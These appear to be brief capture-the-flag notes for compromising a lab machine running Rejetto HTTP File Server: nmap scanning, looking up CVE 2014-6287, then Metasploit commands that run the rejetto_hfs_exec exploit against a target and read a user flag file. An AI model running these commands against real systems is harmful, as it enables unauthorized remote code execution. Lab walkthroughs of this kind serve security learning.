1) 
- nmap IP
- 8080
2) 
- go on the site
- bottom left tells you and it links to the official site
- rejetto HTTP file server
3)
- nmap IP -sV
- exploit-db.com
- search for "rejetto HTTP file server" + the version you found
- 2014-6287
4)
- msfconsole
- search CVENUMBER
- use exploit/windows/http/rejetto_hfs_exec
- set RHOSTS IP
- set RPORT 8080
- set SRVHOST tun0IP
- set SRVPORT 1234
- exploit
- cat /Users/bill/Desktop/user.txt